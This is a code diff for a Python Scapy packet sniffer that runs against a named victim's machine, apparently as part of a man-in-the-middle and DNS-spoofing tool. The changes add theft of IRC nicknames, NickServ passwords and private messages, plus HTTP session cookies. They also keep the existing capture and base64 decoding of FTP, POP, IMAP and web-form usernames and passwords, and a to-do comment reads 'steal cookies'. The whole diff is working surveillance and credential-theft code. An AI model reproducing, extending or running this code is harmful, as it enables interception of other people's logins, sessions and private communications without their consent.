@@ -39,11 +39,11 @@ C  = '\033[36m' # cyan
 GR = '\033[37m' # gray
 T  = '\033[93m' # tan
 
-# /dev/null, send output from programs so they don't print to screen.
 oldack = None
 oldload = None
 oldurl = None
 oldhttp = None
+oldhost = None
 combined_load = None
 
 if args.write:
@@ -69,15 +69,30 @@ class Parser():
 	IMAPdest = ''
 	POPauth = 0
 	POPdest = ''
+	Cookies = []
+	IRCnick = ''
 
 	def start(self, pkt):
 		if pkt.haslayer(Raw) and pkt.haslayer(Ether) and pkt.haslayer(TCP):
-			if pkt[Ether].src == victimMAC:
-				self.URL(pkt)
-			self.mailspy(pkt)
+			dport = pkt[TCP].dport
+			sport = pkt[TCP].sport
+			pktload = repr(pkt[Raw].load)
+			pktload = pktload[1:-1]
+			ack = pkt[TCP].ack
+			MAC_src = pkt[Ether].src
+			MAC_dst = pkt[Ether].dst
+			IP_dst = pkt[IP].dst
+			mail_ports = [143, 110, 26]
+			if dport in mail_ports or sport in mail_ports:
+				self.mailspy(pktload, dport, sport, MAC_src, MAC_dst, IP_dst)
+			if MAC_src == victimMAC:
+				if dport == 6667 or sport == 6667:
+					self.irc(pktload, dport, sport, MAC_src, MAC_dst)
+				else:
+					self.URL(pktload, ack, dport, sport)
 
-	def URL(self, pkt):
-		global oldack, oldload, oldurl, oldhttp, combined_load
+	def URL(self, pktload, ack, dport, sport):
+		global oldack, oldload, oldurl, oldhost, oldhttp, combined_load
 
 		host = None
 		get = None
@@ -85,10 +100,6 @@ class Parser():
 		url = None
 
 		#Split the packet between headers and body and grab the URL from the headers
-		ack = pkt[TCP].ack
-		pktload = repr(pkt[Raw].load).replace("'", "")
-		dport = pkt[TCP].dport
-		sport = pkt[TCP].sport
 		#If you see any other login variable names, tell me and I'll add em in here
 		user_regex = '([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
 		pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&|;]*)'
@@ -119,31 +130,31 @@ class Parser():
 		#Catch fragmented packet passwords, FTP passwords, cookies
 		if args.post:
 			#Catch fragmented packet passwords
-			if oldack == ack and oldload and oldhttp == 'post':
+			if oldack == ack and oldload and oldurl and oldhttp == 'post':
 				combined_load = oldload + pktload
+				try:
+					headers, body = combined_load.split(r"\r\n\r\n")
+				except:
+					headers = combined_load
+					body = ''
+				header_lines = headers.split(r"\r\n")
 				if body != '':
-					print B+'[+] fragmented POST:',oldurl,'HTTP POST load:',body+W
-				else:
-					print B+'[+] fragmented POST:',oldurl,'HTTP POST load:',combined_load+W
-				username = re.findall(user_regex, combined_load)
-				password = re.findall(pw_regex, combined_load)
+					print B+'[+] fragmented POST: '+W+oldurl+B+' HTTP POST load: '+body+W
+				username = re.findall(user_regex, body)
+				password = re.findall(pw_regex, body)
 				self.user_pass(username, password)
-				cookie = re.search('PHPSESSID=[^;|&]*', combined_load)
-				if cookie:
-					print R+'[+] Cookie found:',cookie.group()+W
-					if args.write:
-						logger.write('[+] Cookie found:'+cookie.group()+'\n')
+				self.cookies(oldhost, header_lines)
 			#Catch FTP passwords
 			if dport == 21:
-				load = pktload.replace(r"\r\n", "")
-				if 'USER ' in load:
-					print R+'FTP '+load+W
+				pktload = pktload.replace(r"\r\n", "")
+				if 'USER ' in pktload:
+					print R+'[!] FTP '+pktload+W
 					if args.write:
-						logger.write('FTP'+load+'\n')
-				if 'PASS ' in load:
-					print R+'FTP '+load+W
+						logger.write('FTP'+pktload+'\n')
+				if 'PASS ' in pktload:
+					print R+'[!] FTP '+pktload+W
 					if args.write:
-						logger.write('FTP'+load+'\n')
+						logger.write('[!] FTP'+pktload+'\n')
 
 			#Catch search terms, print url, print post loads
 			if url != None:
@@ -167,29 +178,26 @@ class Parser():
 						pass
 					else:
 						searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=').replace('%22', '\"').replace('%24', '$')
-						print T+'[+] Searched %s for:' % host,searched+W
+						print T+'[+] Searched '+W+host+T+': '+searched+W
 						if args.write:
 							logger.write('[+] Searched %s for: ' % host+searched+'\n')
 
 				#Print POST load
 				if post:
-					if 'ocsp.' in url:
-						print B+'[+] POST:',url+W
+					if 'ocsp' in url:
+						print B+'[+] POST: '+W+url
 					elif body != '':
-						print B+'[+] POST:',url,'HTTP POST load:',body+W
+						print B+'[+] POST: '+W+url+B+' HTTP POST load:',body+W
 						username = re.findall(user_regex, body)
 						password = re.findall(pw_regex, body)
 						self.user_pass(username, password)
-						cookie = re.search('PHPSESSID=[^;][^;]*', body)
-						if cookie:
-							print R+'[+] Cookie found:',cookie.group()+W
-							if args.write:
-								logger.write('[+] Cookie found:'+cookie.group()+'\n')
+						self.cookies(host, header_lines)
 					oldhttp = 'post'
 
 #		oldload = pktload
 		oldack = ack
 		oldurl = url
+		oldhost = host
 		if oldack != ack:
 			oldhttp = None
 			combined_load = None
@@ -201,74 +209,122 @@ class Parser():
 	post = None
 	url = None
 
+	def irc(self, pktload, dport, sport, MAC_src, MAC_dst):
+		if MAC_src == victimMAC:
+			pktload = pktload.split(r"\r\n")[0]
+			if args.post:
+				if 'NICK ' in pktload:
+					self.IRCnick = pktload.replace('NICK ', '')
+					server = pktload.replace('USER user user ', '').replace(' :user', '')
+					print C+'[!] IRC username: '+self.IRCnick+' '+server+W
+					if args.write:
+						logger.write('[!] IRC username: '+IRCnick+' '+server+'\n')
+				if 'NS IDENTIFY ' in pktload:
+					ircpass = pktload.replace('NS IDENTIFY ', '')
+					print C+'[!] IRC password: '+ircpass+W
+					if args.write:
+						logger.write('[!] IRC password: '+ircpass+'\n')
+				if 'JOIN ' in pktload:
+					join = pktload.replace('JOIN ', '')
+					print C+'[+] IRC joined: '+join+W
+					if args.write:
+						logger.write('[+] IRC joined: '+join+'\n')
+				if 'PART ' in pktload:
+					part = pktload.replace('PART ', '')
+					print C+'[+] IRC part: '+part+W
+					if args.write:
+						logger.write('[+] IRC parted: '+part+'\n')
+				if 'QUIT ' in pktload:
+					quit = pktload.replace('QUIT ', '')
+					print C+'[+] IRC quit: '+quit+W
+					if args.write:
+						logger.write('[+] IRC quit: '+quit+'\n')
+				if 'PRIVMSG ' in pktload:
+					channel = pktload.split(':')[0].replace('PRIVMSG ', '').replace(' ', '')
+					ircmsg = pktload.replace('PRIVMSG ', '').replace(':', '').replace(channel, '')
+					if self.IRCnick != '':
+						print C+'[+] IRC '+self.IRCnick+' to '+W+channel+C+':'+ircmsg+W
+						if args.write:
+							logger.write('[+] IRC '+self.IRCnick+' to '+channel+':'+ircmsg+'\n')
+					else:
+						print C+'[+] IRC msg to '+W+channel+C+':'+ircmsg+W
+						if args.write:
+							logger.write('[+] IRC msg to '+channel+':'+ircmsg+'\n')
+
+	def cookies(self, host, header_lines):
+		for x in header_lines:
+			if 'Cookie:' in x:
+				if x in self.Cookies:
+					return
+				elif 'safebrowsing.clients.google.com' in host:
+					return
+				else:
+					self.Cookies.append(x)
+				print P+'[+] Cookie found for '+W+host+P,x.replace('Cookie: ', '')+W
+				if args.write:
+					logger.write('[+] Cookie found for'+host+':'+x.replace('Cookie: ', '')+'\n')
+
 	def user_pass(self, username, password):
 		if username:
 			for u in username:
-				print R+'[+] Username found: '+u[1]+W
+				print R+'[!] Username found: '+u[1]+W
 				if args.write:
-					logger.write('[+] Username: '+u[1]+'\n')
+					logger.write('[!] Username: '+u[1]+'\n')
 		if password:
 			for p in password:
-				print R+'[+] Password: '+p[1]+W
-				if args.write:
-					logger.write('[+] Password: '+p[1]+'\n')
+				if p[1] != '':
+					print R+'[!] Password: '+p[1]+W
+					if args.write:
+						logger.write('[!] Password: '+p[1]+'\n')
 
-	def mailspy(self, pkt):
-		dport = pkt[TCP].dport
-		sport = pkt[TCP].sport
-		MAC_dst = pkt[Ether].dst
-		MAC_src = pkt[Ether].src
-		mail_ports = [143, 110, 26]
-		if dport in mail_ports or sport in mail_ports:
-			load = repr(pkt[Raw].load).replace("'", "")
-			try:
-				headers, body = load.split(r"\r\n\r\n", 1)
-			except:
-				headers = load
-				body = ''
-			header_lines = headers.split(r"\r\n")
-			email_headers = ['Date: ', 'Subject: ', 'To: ', 'From: ']
-#			Find passwords
-			if dport in [110, 143, 26]:
-				IP_dst = pkt[IP].dst
-				self.passwords(IP_dst, load, dport)
-#			Find outgoing messages
-			if dport == 26:
-				self.outgoing(load, body, header_lines, email_headers, MAC_src)
-#			Find incoming msgs
-			if MAC_dst == victimMAC:
-				if sport in [110, 143]:
-					self.incoming(headers, body, header_lines, email_headers)
+	def mailspy(self, pktload, dport, sport, MAC_src, MAC_dst, IP_dst):
+		try:
+			headers, body = pktload.split(r"\r\n\r\n", 1)
+		except:
+			headers = pktload
+			body = ''
+		header_lines = headers.split(r"\r\n")
+		email_headers = ['Date: ', 'Subject: ', 'To: ', 'From: ']
+#		Find passwords
+		if dport in [110, 143, 26]:
+			self.passwords(MAC_src, IP_dst, pktload, dport)
+#		Find outgoing messages
+		if dport == 26:
+			self.outgoing(pktload, body, header_lines, email_headers, MAC_src)
+#		Find incoming messages
+		if MAC_dst == victimMAC:
+			if sport in [110, 143]:
+				self.incoming(headers, body, header_lines, email_headers)
 
-	def passwords(self, IP_dst, load, dport):
-		if dport == 143:
-			if self.IMAPauth == 1 and IP_dst == self.IMAPdest:
-				print R+'[!] IMAP user and pass found: '+load+W
+	def passwords(self, MAC_src, IP_dst, pktload, dport):
+		if dport == 143 and MAC_src == victimMAC:
+			if self.IMAPauth == 1 and self.IMAPdest == IP_dst:
+				print R+'[!] IMAP user and pass found: '+pktload+W
 				if args.write:
-					logger.write('[!] IMAP user and pass found: '+load+'\n')
-				self.decode(load, dport)
+					logger.write('[!] IMAP user and pass found: '+pktload+'\n')
+				self.decode(pktload, dport)
 				self.IMAPauth = 0
 				self.IMAPdest = ''
-			if "authenticate plain" in load:
+			if "authenticate plain" in pktload:
 				self.IMAPauth = 1
 				self.IMAPdest = IP_dst
-		if dport == 110:
-			if self.POPauth == 1 and IP_dst == self.POPdest:
-				print R+'[!] POP user and pass found: '+load+W
+		if dport == 110 and MAC_src == victimMAC:
+			if self.POPauth == 1 and self.POPdest == IP_dst:
+				print R+'[!] POP user and pass found: '+pktload+W
 				if args.write:
-					logger.write('[!] POP user and pass found: '+load+'\n')
-				self.decode(load, dport)
+					logger.write('[!] POP user and pass found: '+pktload+'\n')
+				self.decode(pktload, dport)
 				self.POPauth = 0
 				self.POPdest = ''
-			if "AUTH PLAIN" in load:
+			if 'AUTH PLAIN' in pktload:
 				self.POPauth = 1
 				self.POPdest = IP_dst
 		if dport == 26:
-			if 'AUTH PLAIN ' in load:
-				print R+'[!] POP authentication found: '+load+W
+			if 'AUTH PLAIN ' in pktload:
+				print R+'[!] POP authentication found: '+pktload+W
 				if args.write:
-					logger.write('[!] POP authentication found: '+load+'\n')
-				self.decode(load, dport)
+					logger.write('[!] POP authentication found: '+pktload+'\n')
+				self.decode(pktload, dport)
 
 	def outgoing(self, headers, body, header_lines, email_headers, MAC_src):
 		if MAC_src == victimMAC:
@@ -321,21 +377,21 @@ class Parser():
 		if dport == 26:
 			try:
 				b64str = load.replace("AUTH PLAIN ", "").replace(r"\r\n", "")
-				decoded = repr(base64.b64decode(b64str)).replace("'", "")
+				decoded = repr(b64decode(b64str)).replace("'", "")
 				decoded = decoded.replace(r'\x00', ' ')
 				print R+'[!] Decoded:'+decoded+W
 				if args.write:
-					logger.write('[!] Decoded: '+decoded+'\n')
+					logger.write('[!] Decoded:'+decoded+'\n')
 			except:
 				pass
 		else:
 			try:
 				b64str = load.replace(r"\r\n", "")
-				decoded = repr(base64.b64decode(b64str)).replace("'", "")
+				decoded = repr(b64decode(b64str)).replace("'", "")
 				decoded = decoded.replace(r'\x00', ' ')
 				print R+'[!] Decoded:',decoded+W
 				if args.write:
-					logger.write('[!] Decoded: '+decoded+'\n')
+					logger.write('[!] Decoded:'+decoded+'\n')
 			except:
 				pass
 
@@ -344,7 +400,8 @@ class Threads():
 	def urlspy(self, victimIP, interface):
 #		This is in case you need to test the program without an actual victim
 #		sniff(store=0, filter='port 80 or port 21', prn=URL, iface=interface)
-		sniff_filter = '(port 80 or port 21 or port 143 or port 110 or port 26) and host %s' % victimIP
+#		sniff_filter = '(port 80 or port 21 or port 143 or port 110 or port 26) and host %s' % victimIP
+		sniff_filter = 'port 80 or port 21 or port 143 or port 110 or port 26 or port 6667'
 		sniff(store=0, filter=sniff_filter, prn=Parser().start, iface=interface)
 
 	def dnsspoof(self, victimIP):
@@ -529,3 +586,5 @@ if __name__ == "__main__":
 
 #To do:
 #use iptables to block dns responses from the router to prevent race condition in dns spoofing
+#fix base64 decode for POP I think?
+#steal cookies
